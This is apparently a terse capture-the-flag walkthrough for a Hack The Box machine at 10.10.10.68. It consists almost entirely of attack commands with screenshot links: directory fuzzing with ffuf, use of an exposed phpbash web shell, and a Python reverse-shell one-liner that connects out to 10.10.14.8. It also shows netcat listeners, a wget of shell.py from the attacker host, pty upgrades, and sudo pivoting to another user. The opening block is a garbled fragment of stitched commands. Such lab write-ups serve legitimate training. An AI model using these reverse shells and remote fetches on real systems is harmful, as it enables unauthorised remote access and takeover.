```
[ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fc 403 -e .aspx,.php,.txt,.html
/dev/phpbash.php
reverse shell - python
python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -l
sudo -u scriptmanager bash -i
python -c shell.py
](http://10.10.10.68/dev/phpbash.php
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
nc -nlvp 1234
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
sudo -l
python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -u scriptmanager bash -i
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
python -c shell.py)
```


```
nmap -sS -sC -sV -T5 -Pn 10.10.10.68
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bc9cd0fd-fd2e-45f4-9c77-be705cc2acd2)

![image](https://user-images.githubusercontent.com/33616880/231078885-d693a7c8-64c3-4d4d-8792-30f38a714312.png)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.68/FUZZ -fw 22 -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1aa722cc-5bca-43a1-b614-880a38a27f10)


```
http://10.10.10.68/dev/phpbash.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/178b962b-8973-473b-995f-30bb71bbb29b)
f-a8f4-c5d1578b3fa2)


```
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
nc -nlvp 1234
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
![image](https://user-images.githubusercontent.com/33616880/231055113-1d7b8689-2d39-468a-bf6d-6c5f0a63926c.png)
![image](https://user-images.githubusercontent.com/33616880/231055372-e58304c2-36da-4de5-a9a3-76599f6bf2a9.png)


```
sudo -l
python3 -c "import pty;pty.spawn('/bin/bash')"
sudo -u scriptmanager bash -i
```
![image](https://user-images.githubusercontent.com/33616880/231083178-a2ff7d4c-fbbf-4701-885e-399f0a2bd732.png)
![image](https://user-images.githubusercontent.com/33616880/231083338-54eabf9e-3306-488f-800c-b2ac046a8175.png)

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
```
wget 10.10.14.8/shell.py
```
```
nc -nlvp 4444
python -c shell.py
```
```
python3 -c "import pty;pty.spawn('/bin/bash')"
```
![image](https://user-images.githubusercontent.com/33616880/231084808-1b28d08b-1c89-46bd-9d76-3770e62233fc.png)
![image](https://user-images.githubusercontent.com/33616880/231085786-4b06a14b-e3d7-4406-98b4-ab4f676953d9.png)
